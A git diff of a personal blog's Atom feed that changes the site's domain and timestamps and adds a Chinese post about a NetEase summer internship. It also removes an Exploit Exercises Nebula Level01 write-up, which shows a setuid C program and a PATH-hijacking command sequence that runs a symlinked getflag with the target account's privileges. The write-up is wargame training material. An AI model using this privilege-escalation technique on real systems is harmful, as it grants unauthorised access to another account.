@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[Han]]></title>
-  <link href="http://zealoct.github.io/atom.xml" rel="self"/>
-  <link href="http://zealoct.github.io/"/>
-  <updated>2014-05-21T13:35:26+08:00</updated>
-  <id>http://zealoct.github.io/</id>
+  <link href="http://hanjc.me/atom.xml" rel="self"/>
+  <link href="http://hanjc.me/"/>
+  <updated>2014-07-11T23:54:57-07:00</updated>
+  <id>http://hanjc.me/</id>
   <author>
     <name><![CDATA[Zealoct]]></name>
     
@@ -14,10 +14,35 @@
 
   
   <entry>
+    <title type="html"><![CDATA[暑期实习开始]]></title>
+    <link href="http://hanjc.me/blog/2014/07/05/summer-intern/"/>
+    <updated>2014-07-05T21:44:53-07:00</updated>
+    <id>http://hanjc.me/blog/2014/07/05/summer-intern</id>
+    <content type="html"><![CDATA[<p>记得很清楚，拿到网易暑期实习 offer 是 4 月 30 号，正好是劳动节放假前一天，当时真的是很开心，感觉实习终于有着落了，而且还是我的首选网易游戏，所以那个劳动节过的格外开心。实习从 7 月开始，6 月末收到公司邮件通知，从 6 月 29 号开始就可以去杭州报道了，这点不得不称赞网易，对实习生的待遇非常不错，公司食堂免费吃，还提供住宿，不过因为实习生较多，公司的宿舍不够用了，所以我被分在了公司附近的乐通酒店。去之前特意查了下地图，发现公司提供住宿的几家酒店里乐通是离得最近的，跟公司只隔了一个街区，走路 10 分钟妥妥儿的，这一点还是非常方便的。</p>
+
+<p>我跟几个朋友一起，乘坐 29 号的火车来杭州，出了火车站几个人做的第一件事就是去办了张杭州一卡通，可以租自行车的那种，后来证明这个举动真是太明智了，因为我跟老缪出了地铁站之后就是租量小车慢慢悠悠骑到乐通的。我们就这样，骑着租来的橘黄色的小破车，拖着的拉杆箱，慢慢悠悠的开始了暑期杭州的日子。</p>
+
+<!-- more -->
+
+
+<p>初到乐通，一种大张江的即视感瞬间就让我泪流满面了，这环境，这布局，这没一个人影的大马路，还真是熟悉的场景，熟悉的味道。我们一行人中，只有我跟老缪住乐通，另外几个住另外一个酒店，虽然离公司较远，但是居然毗邻商圈，简直不能更惬意，于是当晚大家就约定去那个名叫“星光大道”的地方转一转。我跟老缪再次利用了杭州的自行车，一边拍大腿感慨真他妈方便一边来到了目的地，也就十几分钟，算不得很远。星光大道吃饭的地方还是不少的，还有之前跟蔚蔚一起吃过的非常好吃的老头儿油爆虾，感觉住在这边的孩子的生活质量真比我们高了好多，有点像张江和世纪大道的差别了。</p>
+
+<p>6 月 30 号下暴雨，在宾馆闲着，顺便看看 cocos2d，毕竟马上实习开始就要用到，完全不会也说不过去。中午在宾馆门口发现大批黑暗料理，就吃了份鸡肉饭，晚上偷溜进公司食堂愉快的蹭了一顿饭，同时也从食堂门口的通告得知因为实习生和新员工入职，从 7 月 1 日起食堂二楼小锅菜临时改成大众餐厅了，当天是最后一天，很遗憾不能品尝一下网易的特色菜。吃完饭跑去食堂二楼参观，时候发现大家居然都在吃火锅，而且貌似是老北京涮羊肉那种铜锅！当时瞬间给网易加了一百分啊卧槽，可惜这些我们也是无缘享受的……吃完饭还去参观了篮球场，不得不说网易的木地板真心不错，比张江的好太多了，恨不得当时就上去打一场。</p>
+
+<p>7 月 1 号正式开始在网易的暑期实习，头两天都没做什么事情，基本上就是入职讲座啊，认识一下导师啊，配配环境什么的，我做的主要事情就是在公司转了转，看看都有哪些玩儿的。体育馆、健身房、游戏室、射箭馆以及桌球房这些地方基本上都去了一遍，感觉公司活动还是蛮多的，到了周五晚上还会有分部门的烧烤、啤酒活动。
+公司内部环境的话感觉还不错啦，座位跟实验室相比的话还是不如的，不过公共空间非常宽敞，来公司几天之后就发现游戏公司男女比例非常均衡，而且质量都不错，连平时专打 2 分和 3 分的老缪都给了好几个 7、8 分了，我们几个都在教唆他抓住实习机遇把个人问题解决了 (=</p>
+
+<p>工作的话，我实习被分到了 minigame 项目，六人组队做一个小游戏出来，组内两名策划，三名程序，一名 QA，使用 cocos2d + lua 来实现。被分到这个项目组还是挺开心的，相当于提前感受了一把公司里面游戏项目迭代的过程，也有一些挑战性，毕竟 cocos2d 和 lua 我都不是很熟，两个月的时间要从头学起并做出一个实际的东西来，而且要和策划、QA 一起合作，挺新鲜好玩儿的。</p>
+
+<p>加油！</p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[如何写 Ubuntu 的 Framebuffer]]></title>
-    <link href="http://zealoct.github.io/blog/2014/05/20/ubuntu-fbvnc/"/>
-    <updated>2014-05-20T20:26:25+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/05/20/ubuntu-fbvnc</id>
+    <link href="http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc/"/>
+    <updated>2014-05-20T05:26:25-07:00</updated>
+    <id>http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc</id>
     <content type="html"><![CDATA[<p>最近有个小项目，想在 Android 上跑一个通过直接读写 framebuffer 实现的 vnc 客户端，
 所以发现了这个 <a href="https://github.com/zohead/fbvnc">fbvnc</a>， 是 github 上一个小哥儿捣鼓的，基于现有的一个同名项目开发，专为嵌入式设备使用。这个小的 vnc 客户端的不足当然有很多，比如连基本的窗口都木有，直接占用了你整个 framebuffer，不能调整分辨率，巨慢无比，卡的紧了就直接挂，但是它有一个最大的优点，就是真的非常简单，除了一些基本的 Linux 库之外没有任何第三方的依赖。</p>
 
@@ -202,9 +227,9 @@
   
   <entry>
     <title type="html"><![CDATA[简单的递归和动态规划]]></title>
-    <link href="http://zealoct.github.io/blog/2014/04/05/recursion-and-dp/"/>
-    <updated>2014-04-05T13:31:50+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/04/05/recursion-and-dp</id>
+    <link href="http://hanjc.me/blog/2014/04/04/recursion-and-dp/"/>
+    <updated>2014-04-04T22:31:50-07:00</updated>
+    <id>http://hanjc.me/blog/2014/04/04/recursion-and-dp</id>
     <content type="html"><![CDATA[<h3>题目：WordBreak</h3>
 
 <p>首先定义如下表示</p>
@@ -360,9 +385,9 @@
   
   <entry>
     <title type="html"><![CDATA[Linux 下 c 的扩展内联汇编]]></title>
-    <link href="http://zealoct.github.io/blog/2014/03/05/c-asm/"/>
-    <updated>2014-03-05T19:54:09+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/03/05/c-asm</id>
+    <link href="http://hanjc.me/blog/2014/03/05/c-asm/"/>
+    <updated>2014-03-05T03:54:09-08:00</updated>
+    <id>http://hanjc.me/blog/2014/03/05/c-asm</id>
     <content type="html"><![CDATA[<p>简单总结了一下自己看到用到的一些内联汇编的知识点，并不是一个完整的总结，以后对内联汇编有了新的了解会慢慢扩充。</p>
 
 <p>详细细节可以参考 gcc 关与扩展内联汇编的 <a href="http://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#Extended-Asm">文档</a></p>
@@ -485,9 +510,9 @@
   
   <entry>
     <title type="html"><![CDATA[Notes on iOS Security Whitepaper]]></title>
-    <link href="http://zealoct.github.io/blog/2014/03/03/ios-security/"/>
-    <updated>2014-03-03T19:56:09+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/03/03/ios-security</id>
+    <link href="http://hanjc.me/blog/2014/03/03/ios-security/"/>
+    <updated>2014-03-03T03:56:09-08:00</updated>
+    <id>http://hanjc.me/blog/2014/03/03/ios-security</id>
     <content type="html"><![CDATA[<p>This notes is based on <em>iOS Security &ndash; February 2014</em>, origin link can be found <a href="http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf">here</a>.</p>
 
 <p>This paper gives a brief description of iOS security, including hardware security features and how iOS leverages these features.</p>
@@ -788,9 +813,9 @@ on the computer where the device is backed up. The backed-up data is <strong>re-
   
   <entry>
     <title type="html"><![CDATA[Using theme Greyshade]]></title>
-    <link href="http://zealoct.github.io/blog/2014/02/27/using-theme-greyshade/"/>
-    <updated>2014-02-27T14:11:32+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/02/27/using-theme-greyshade</id>
+    <link href="http://hanjc.me/blog/2014/02/26/using-theme-greyshade/"/>
+    <updated>2014-02-26T22:11:32-08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/26/using-theme-greyshade</id>
     <content type="html"><![CDATA[<p>Sometimes ago I came across a blog <a href="http://samwize.com/">samwize</a>, who uses a slightly
 modified theme called <a href="https://github.com/shashankmehta/greyshade">Greyshade</a>, which I
 think is very beautiful, so I applied that theme immediately. Saddly this theme does
@@ -838,9 +863,9 @@ so I need to patch my modification and merge it into the Greyshade. I would do t
   
   <entry>
     <title type="html"><![CDATA[Vim Efficiency Notes]]></title>
-    <link href="http://zealoct.github.io/blog/2014/02/24/vim-notes/"/>
-    <updated>2014-02-24T15:00:00+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/02/24/vim-notes</id>
+    <link href="http://hanjc.me/blog/2014/02/24/vim-notes/"/>
+    <updated>2014-02-24T15:00:00-08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/24/vim-notes</id>
     <content type="html"><![CDATA[<p>关于Vim的一些容易被忽视、却又能提升使用体验和操作效率的操作细节。同时记录Vim中一些（我见到过的）比较实用的配置，分享的同时也给自己留个备忘吧。
 一下子总结不完整，慢慢更新。</p>
 
@@ -909,9 +934,9 @@ A 是在本行行尾插入，I 是在本行行首插入。</p>
   
   <entry>
     <title type="html"><![CDATA[Notes on Paxos Made Simple]]></title>
-    <link href="http://zealoct.github.io/blog/2014/02/12/paxos/"/>
-    <updated>2014-02-12T16:21:02+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/02/12/paxos</id>
+    <link href="http://hanjc.me/blog/2014/02/12/paxos/"/>
+    <updated>2014-02-12T00:21:02-08:00</updated>
+    <id>http://hanjc.me/blog/2014/02/12/paxos</id>
     <content type="html"><![CDATA[<p><a href="http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf">Origin paper link</a></p>
 
 <h3>Problem</h3>
@@ -1147,9 +1172,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 13]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level13/"/>
-    <updated>2014-01-26T21:54:12+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level13</id>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level13/"/>
+    <updated>2014-01-26T05:54:12-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level13</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
@@ -1361,9 +1386,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 12]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level12/"/>
-    <updated>2014-01-26T20:12:53+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level12</id>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level12/"/>
+    <updated>2014-01-26T04:12:53-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level12</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There is a backdoor process listening on port 50001.</p>
@@ -1542,9 +1567,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 11]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level11/"/>
-    <updated>2014-01-26T16:44:20+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level11</id>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level11/"/>
+    <updated>2014-01-26T00:44:20-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level11</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>/home/flag11/flag11</em> binary processes standard input and executes a shell command.</p>
@@ -1935,9 +1960,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 10]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/25/nebula-level10/"/>
-    <updated>2014-01-25T12:40:53+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/25/nebula-level10</id>
+    <link href="http://hanjc.me/blog/2014/01/24/nebula-level10/"/>
+    <updated>2014-01-24T20:40:53-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/24/nebula-level10</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>
@@ -2167,9 +2192,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 09]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/24/nebula-level09/"/>
-    <updated>2014-01-24T11:43:40+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/24/nebula-level09</id>
+    <link href="http://hanjc.me/blog/2014/01/23/nebula-level09/"/>
+    <updated>2014-01-23T19:43:40-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/23/nebula-level09</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
@@ -2244,7 +2269,7 @@ and the output is</p>
 
 <ul>
 <li>read the content of file $argv[1]</li>
-<li>replace all the text paterns liket &ldquo;[email <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#104;&#106;&#x63;&#x40;&#104;&#x61;&#x6e;&#106;&#99;&#46;&#x6d;&#101;">&#x68;&#x6a;&#99;&#64;&#x68;&#97;&#x6e;&#106;&#99;&#46;&#x6d;&#101;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
+<li>replace all the text paterns liket &ldquo;[email <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#104;&#x6a;&#x63;&#x40;&#104;&#97;&#110;&#106;&#99;&#x2e;&#109;&#101;">&#x68;&#x6a;&#99;&#x40;&#104;&#x61;&#110;&#106;&#x63;&#x2e;&#x6d;&#101;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
 <li>replace all the &ldquo;[&rdquo; with &ldquo;&lt;&rdquo;, replace &ldquo;]&rdquo; with &ldquo;>&rdquo;</li>
 </ul>
 
@@ -2288,9 +2313,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 08]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/24/nebula-level08/"/>
-    <updated>2014-01-24T11:43:31+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/24/nebula-level08</id>
+    <link href="http://hanjc.me/blog/2014/01/23/nebula-level08/"/>
+    <updated>2014-01-23T19:43:31-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/23/nebula-level08</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
@@ -2315,9 +2340,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 07]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level07/"/>
-    <updated>2014-01-13T15:49:10+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level07</id>
+    <link href="http://hanjc.me/blog/2014/01/12/nebula-level07/"/>
+    <updated>2014-01-12T23:49:10-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/12/nebula-level07</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
@@ -2396,9 +2421,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 06]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level06/"/>
-    <updated>2014-01-13T15:48:33+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level06</id>
+    <link href="http://hanjc.me/blog/2014/01/12/nebula-level06/"/>
+    <updated>2014-01-12T23:48:33-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/12/nebula-level06</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>flag06</em> account credentials came from a legacy unix system.</p>
@@ -2421,9 +2446,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 05]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level05/"/>
-    <updated>2014-01-13T14:16:44+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level05</id>
+    <link href="http://hanjc.me/blog/2014/01/12/nebula-level05/"/>
+    <updated>2014-01-12T22:16:44-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/12/nebula-level05</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>Check the <em>flag05</em> home directory. You are looking for weak directory permissions</p>
@@ -2513,9 +2538,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 04]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/10/nebula-level04/"/>
-    <updated>2014-01-10T20:43:48+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/10/nebula-level04</id>
+    <link href="http://hanjc.me/blog/2014/01/10/nebula-level04/"/>
+    <updated>2014-01-10T04:43:48-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/10/nebula-level04</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
@@ -2624,9 +2649,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 03]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/09/nebula-level03/"/>
-    <updated>2014-01-09T17:03:25+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/09/nebula-level03</id>
+    <link href="http://hanjc.me/blog/2014/01/09/nebula-level03/"/>
+    <updated>2014-01-09T01:03:25-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/09/nebula-level03</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>Check the home directory of flag03 and take note of the files there.</p>
@@ -2733,9 +2758,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level02]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/09/nebula-level02/"/>
-    <updated>2014-01-09T15:13:38+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/09/nebula-level02</id>
+    <link href="http://hanjc.me/blog/2014/01/08/nebula-level02/"/>
+    <updated>2014-01-08T23:13:38-08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/08/nebula-level02</id>
     <content type="html"><![CDATA[<p>基本过程与level01一样，先看/home/flag02/flag02的源代码：</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -2859,76 +2884,6 @@ and the output is</p>
 
 
 <p>第一条会在新的进程中执行la，而在本进程中执行ll，第二条则会新起两个进程分别执行la和ll。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Exploit Exercises - Nebula Level01]]></title>
-    <link href="http://zealoct.github.io/blog/2014/01/09/nebula-level01/"/>
-    <updated>2014-01-09T14:54:40+08:00</updated>
-    <id>http://zealoct.github.io/blog/2014/01/09/nebula-level01</id>
-    <content type="html"><![CDATA[<p>有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<!-- more -->
-
-
-<p></p>
-
-<p>前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ <span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/level01:<span class="nv">$PATH</span>
-</span><span class='line'>~ <span class="nv">$ </span>ln -s /bin/getflag /home/level01/echo
-</span><span class='line'>~ <span class="nv">$ </span>/home/flag01/flag01
-</span><span class='line'>You have successfully executed getflag on a target account
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。</p>
 ]]></content>
   </entry>
   
